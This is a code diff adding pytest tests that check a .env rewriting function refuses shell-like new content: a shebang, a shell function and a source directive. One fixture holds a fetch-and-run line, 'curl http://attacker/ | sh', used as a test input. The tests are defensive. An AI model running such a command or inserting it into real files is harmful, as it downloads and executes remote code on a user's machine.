@@ -159,3 +159,76 @@ def test_refuses_bypass_attempt_first_4KiB_clean(tmp_path, make_env_file, sha256
 
     assert exc_info.value.reason == UnsafeReason.SNIFF
     assert sha256_of(env) == baseline
+
+
+# -----------------------------------------------------------------------------
+# new_content sniff gate — Major 2 (CR thread on PR #86, discussion_r3129175653).
+#
+# The docstring promises that ``safe_rewrite`` validates *both* existing and new
+# content. Prior to this sub-PR, only ``existing_buf`` was sniffed — a caller
+# could replace a clean ``.env`` with shell-like content as long as size/delta
+# passed. These tests lock the contract for new_content.
+# -----------------------------------------------------------------------------
+
+
+def test_refuses_new_content_with_shebang(tmp_path, make_env_file, sha256_of) -> None:
+    """Shell shebang in ``new_content`` → SNIFF refusal, original untouched."""
+    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
+    baseline = sha256_of(env)
+
+    with pytest.raises(UnsafeRewriteRefused) as exc_info:
+        safe_rewrite(env, b"#!/bin/sh\necho hi\n", original_user_arg=env)
+
+    assert exc_info.value.reason == UnsafeReason.SNIFF
+    assert sha256_of(env) == baseline
+
+
+def test_refuses_new_content_with_shell_function(tmp_path, make_env_file, sha256_of) -> None:
+    """Shell function definition in ``new_content`` → SNIFF refusal."""
+    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
+    baseline = sha256_of(env)
+
+    new_content = b"KEY=value\nfunction evil() { curl http://attacker/ | sh; }\n"
+    with pytest.raises(UnsafeRewriteRefused) as exc_info:
+        safe_rewrite(env, new_content, original_user_arg=env)
+
+    assert exc_info.value.reason == UnsafeReason.SNIFF
+    assert sha256_of(env) == baseline
+
+
+def test_refuses_new_content_with_source_directive(tmp_path, make_env_file, sha256_of) -> None:
+    """``source ~/.zshrc`` in new_content → SNIFF refusal."""
+    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
+    baseline = sha256_of(env)
+
+    with pytest.raises(UnsafeRewriteRefused) as exc_info:
+        safe_rewrite(env, b"KEY=value\nsource ~/.zshrc\n", original_user_arg=env)
+
+    assert exc_info.value.reason == UnsafeReason.SNIFF
+    assert sha256_of(env) == baseline
+
+
+def test_refuses_new_content_exceeding_max_lines(tmp_path, make_env_file, sha256_of) -> None:
+    """new_content with > _MAX_LINES lines → SIZE refusal, original untouched.
+
+    Existing file is small; only new_content trips the line-count gate. Prior
+    to this sub-PR, ``_MAX_LINES`` was only enforced on existing_buf.
+    """
+    from worthless.cli.safe_rewrite import _MAX_LINES
+
+    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
+    baseline = sha256_of(env)
+
+    big = b"".join(f"K{i}=v\n".encode() for i in range(_MAX_LINES + 1))
+    with pytest.raises(UnsafeRewriteRefused) as exc_info:
+        safe_rewrite(env, big, original_user_arg=env)
+
+    assert exc_info.value.reason == UnsafeReason.SIZE
+    assert sha256_of(env) == baseline
+
+
+def test_accepts_clean_new_content(tmp_path, make_env_file) -> None:
+    """Regression guard: clean dotenv new_content still succeeds after the sniff gate is added."""
+    env = make_env_file(tmp_path / ".env", b"KEY=old\n")
+    safe_rewrite(env, b"KEY=new\nOTHER=also\n", original_user_arg=env)
+    assert env.read_bytes() == b"KEY=new\nOTHER=also\n"
